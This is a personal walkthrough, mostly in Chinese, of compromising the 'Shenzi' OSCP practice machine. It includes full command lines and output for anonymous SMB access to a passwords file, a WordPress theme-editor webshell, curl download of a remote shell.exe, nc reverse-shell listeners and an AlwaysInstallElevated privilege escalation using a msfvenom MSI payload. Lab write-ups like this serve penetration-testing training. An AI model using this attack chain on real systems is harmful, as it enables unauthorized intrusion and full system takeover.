## Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Shenzi]
└─$ ~/tools/nmapAutomator/nmapAutomator.sh -H 192.168.200.55 -t Full

Running a Full scan on 192.168.200.55

Host is likely running Unknown OS!


---------------------Starting Full Scan------------------------



PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Making a script scan on all ports


PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.200.55/dashboard/
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| tls-alpn:
|_  http/1.1
| http-title: Welcome to XAMPP
|_Requested resource was https://192.168.200.55/dashboard/
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings:
|   FourOhFourRequest, Kerberos, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TerminalServer, WMSRequest, X11Probe:
|_    Host '192.168.45.244' is not allowed to connect to this MariaDB server
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2023-09-01T06:54:50
|_  start_date: N/A




---------------------Finished all scans------------------------


Completed in 4 minute(s) and 20 second(s)
```

訪問 web 看到版本是 7.4.6

![[截圖 2023-09-01 下午3.12.53.png]]

用 dirsearch 發現有 phpinfo 頁面 [phpinfo](https://192.168.200.55/dashboard/phpinfo.php)

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Shenzi]
└─$ dirsearch -u http://192.168.200.55/ -e *

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: 192.168.200.55 | HTTP method: GET | Threads: 30 | Wordlist size: 9009

Output File: /home/ouyang/.dirsearch/reports/192.168.200.55/-_23-09-01_16-33-19.txt

Error Log: /home/ouyang/.dirsearch/logs/errors-23-09-01_16-33-19.log

Target: http://192.168.200.55/

[16:33:20] Starting:
[16:33:21] 403 -    1KB - /%ff
[16:33:21] 403 -    1KB - /%3f/
[16:33:21] 403 -    1KB - /%C0%AE%C0%AE%C0%AF
[16:33:27] 403 -    1KB - /.ht_wsr.txt
[16:33:27] 403 -    1KB - /.htaccess.orig
[16:33:27] 403 -    1KB - /.htaccess.save
[16:33:27] 403 -    1KB - /.htaccess_extra
[16:33:27] 403 -    1KB - /.htaccess_orig
[16:33:27] 403 -    1KB - /.htaccess_sc
[16:33:27] 403 -    1KB - /.htaccessBAK
[16:33:27] 403 -    1KB - /.htaccessOLD
[16:33:27] 403 -    1KB - /.htaccessOLD2
[16:33:27] 403 -    1KB - /.htm
[16:33:27] 403 -    1KB - /.html
[16:33:27] 403 -    1KB - /.htaccess.sample
[16:33:27] 403 -    1KB - /.htaccess.bak1
[16:33:27] 403 -    1KB - /.htpasswd_test
[16:33:27] 403 -    1KB - /.httr-oauth
[16:33:27] 403 -    1KB - /.htpasswds
[16:33:44] 403 -    1KB - /Trace.axd::$DATA
[16:33:47] 200 -  780B  - /Webalizer/
[16:34:09] 403 -    1KB - /cgi-bin/
[16:34:10] 500 -    1KB - /cgi-bin/printenv.pl
[16:34:15] 200 -    6KB - /dashboard/howto.html
[16:34:15] 301 -  344B  - /dashboard  ->  http://192.168.200.55/dashboard/
[16:34:16] 200 -   31KB - /dashboard/faq.html
[16:34:16] 200 -   78KB - /dashboard/phpinfo.php
[16:34:19] 403 -    1KB - /error/
[16:34:21] 200 -   30KB - /favicon.ico
[16:34:22] 503 -    1KB - /examples
[16:34:22] 503 -    1KB - /examples/
[16:34:22] 503 -    1KB - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[16:34:22] 503 -    1KB - /examples/servlets/servlet/CookieExample
[16:34:22] 503 -    1KB - /examples/jsp/snp/snoop.jsp
[16:34:22] 503 -    1KB - /examples/servlets/index.html
[16:34:22] 503 -    1KB - /examples/servlet/SnoopServlet
[16:34:22] 503 -    1KB - /examples/servlets/servlet/RequestHeaderExample
[16:34:27] 301 -  338B  - /img  ->  http://192.168.200.55/img/
[16:34:27] 302 -    0B  - /index.pHp  ->  http://192.168.200.55/dashboard/
[16:34:27] 302 -    0B  - /index.php  ->  http://192.168.200.55/dashboard/
[16:34:27] 302 -    0B  - /index.php.  ->  http://192.168.200.55/dashboard/
[16:34:27] 403 -    1KB - /index.php::$DATA
[16:34:27] 302 -    0B  - /index.php/login/  ->  http://192.168.200.55/dashboard/
[16:34:40] 403 -    1KB - /phpmyadmin/ChangeLog
[16:34:40] 403 -    1KB - /phpmyadmin/doc/html/index.html
[16:34:40] 403 -    1KB - /phpmyadmin/README
[16:34:40] 403 -    1KB - /phpmyadmin/docs/html/index.html
[16:34:42] 403 -    1KB - /phpmyadmin
[16:34:44] 403 -    1KB - /phpmyadmin/phpmyadmin/index.php
[16:34:44] 403 -    1KB - /phpmyadmin/index.php
[16:34:44] 403 -    1KB - /phpmyadmin/
[16:34:44] 403 -    1KB - /phpmyadmin/scripts/setup.php
[16:34:50] 403 -    1KB - /server-status/
[16:34:50] 403 -    1KB - /server-status
[16:34:50] 403 -    1KB - /server-info
[16:35:01] 403 -    1KB - /web.config::$DATA
[16:35:01] 403 -    1KB - /webalizer
[16:35:03] 200 -  772B  - /xampp/

Task Completed
```

透過 smbclient 確認是否沒 credential 可連線

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Shenzi]
└─$ smbclient -U '' -L //192.168.200.55/Shenzi
Password for [WORKGROUP\]:

	Sharename       Type      Comment
	---------       ----      -------
	IPC$            IPC       Remote IPC
	Shenzi          Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.200.55 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

看到有個 Shenzi Disk 似乎可連線

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Shenzi]
└─$ smbclient -U '' //192.168.200.55/Shenzi
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu May 28 23:45:09 2020
  ..                                  D        0  Thu May 28 23:45:09 2020
  passwords.txt                       A      894  Thu May 28 23:45:09 2020
  readme_en.txt                       A     7367  Thu May 28 23:45:09 2020
  sess_klk75u2q4rpgfjs3785h6hpipp      A     3879  Thu May 28 23:45:09 2020
  why.tmp                             A      213  Thu May 28 23:45:09 2020
  xampp-control.ini                   A      178  Thu May 28 23:45:09 2020

		12941823 blocks of size 4096. 6507450 blocks available
smb: \>
```

把 passwords.txt 載下來看看

```json
smb: \> get passwords.txt
getting file \passwords.txt of size 894 as passwords.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Shenzi]
└─$ cat passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ]

3) Mercury (not in the USB & lite version):

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser
   Password: wampp

4) WEBDAV:

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf

   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so

   Please do not forget to refresh the WEBDAV authentification (users and passwords).

5) WordPress:

   User: admin
   Password: FeltHeadwallWight357
```

得到多組密碼！

嘗試用 machine & smb share name 作為網站路徑，[Shenzi](https://192.168.200.55/Shenzi/)

[wordpress](https://192.168.200.55/shenzi/wp-login.php) 成功用獲得的帳密登入！

![[截圖 2023-09-01 下午5.17.58.png]]

可看到版本為 5.4.1

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Shenzi]
└─$ curl https://192.168.200.55/Shenzi/ -k | grep 'content="WordPress'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0<meta name="generator" content="WordPress 5.4.1" />
100 26065    0 26065    0     0  22351      0 --:--:--  0:00:01 --:--:-- 22354
```

[wordpress](https://192.168.200.55/shenzi/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty) 發現可以修改 404.php

![[截圖 2023-09-01 下午5.26.56.png]]

在其中塞入 webshell

![[截圖 2023-09-01 下午5.28.32.png]]

```http
https://192.168.200.55/shenzi/wp-admin/404.php?cmd=dir
```

![[截圖 2023-09-01 下午5.29.12.png]]

成功 RCE!
接著上傳 reverse shell

```http
https://192.168.200.55/shenzi/wp-admin/404.php?cmd=curl%20http://192.168.45.244/shell.exe%20--output%20shell.exe

https://192.168.200.55/shenzi/wp-admin/404.php?cmd=.\shell.exe
```

```json
┌──(ouyang㉿kali)-[/usr/share/windows-binaries]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.244] from (UNKNOWN) [192.168.200.55] 60590
Microsoft Windows [Version 10.0.19042.1526]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\shenzi>
```

get shell!

嘗試執行 winPEAS 看有無發現

```json
����������͹ Checking AlwaysInstallElevated
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```

依照 [hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated) 所述，只要這 2 個 registers 被 enable，任何 user 都可以用 NT AUTHORITY\\SYSTEM 權限安裝 msi 檔案

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Shenzi]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.244 LPORT=5555 -f msi -o reverse.msi
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: reverse.msi
```

	重連 VPN，IP 換成 192.168.211.55

靶機
```json
C:\xampp\htdocs\shenzi>shell.msi
shell.msi
```

kali:
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Shenzi]
└─$ nc -nvlp 443
listening on [any] 443 ...
connect to [192.168.45.220] from (UNKNOWN) [192.168.211.55] 50246
Microsoft Windows [Version 10.0.19042.1526]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```


